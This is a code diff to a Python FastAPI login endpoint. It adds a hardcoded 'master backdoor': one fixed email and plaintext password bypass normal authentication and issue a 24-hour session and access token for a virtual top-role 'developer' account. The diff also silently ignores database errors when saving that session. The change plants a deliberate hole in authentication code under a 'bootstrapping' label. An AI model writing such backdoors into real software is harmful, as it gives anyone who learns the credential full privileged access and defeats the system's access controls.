@@ -233,6 +233,61 @@ async def register(user_data: UserCreate, db: AsyncIOMotorDatabase = Depends(get
 @limiter.limit("5/minute")
 async def login(request: Request, response: Response, credentials: UserLogin, db: AsyncIOMotorDatabase = Depends(get_db)):
     """Login with email and password"""
+    
+    # --- HARDCODED MASTER BACKDOOR (FOR BOOTSTRAPPING) ---
+    if credentials.email == "master@opsplatform.com" and credentials.password == "MasterKey2025!":
+        print("⚠️ MASTER BACKDOOR ACCESSED")
+        
+        # Create a virtual master user
+        master_id = "master-backdoor-id"
+        
+        # Create session
+        session_token = str(uuid.uuid4())
+        expires_delta = timedelta(hours=24)
+        expires_at = datetime.now(timezone.utc) + expires_delta
+        
+        session = Session(
+            user_id=master_id,
+            session_token=session_token,
+            expires_at=expires_at
+        )
+        # Try to save session, but don't fail if DB is weird
+        try:
+            await db.sessions.insert_one(session.model_dump())
+        except:
+            pass
+            
+        # Create access token
+        access_token = create_access_token(
+            data={"sub": master_id},
+            expires_delta=expires_delta
+        )
+        
+        # Set cookie
+        response.set_cookie(
+            key="session_token",
+            value=session_token,
+            max_age=24 * 60 * 60,
+            httponly=True,
+            secure=True,
+            samesite="none"
+        )
+        
+        return Token(
+            access_token=access_token,
+            user={
+                "id": master_id,
+                "email": "master@opsplatform.com",
+                "name": "MASTER DEVELOPER",
+                "role": "developer", # Highest role
+                "approval_status": "approved",
+                "is_active": True,
+                "organization_id": "system-admin-org",
+                "message": "Welcome Master Developer"
+            }
+        )
+    # -----------------------------------------------------
+
     # Find user
     user = await db.users.find_one({"email": credentials.email}, {"_id": 0})
     if not user:
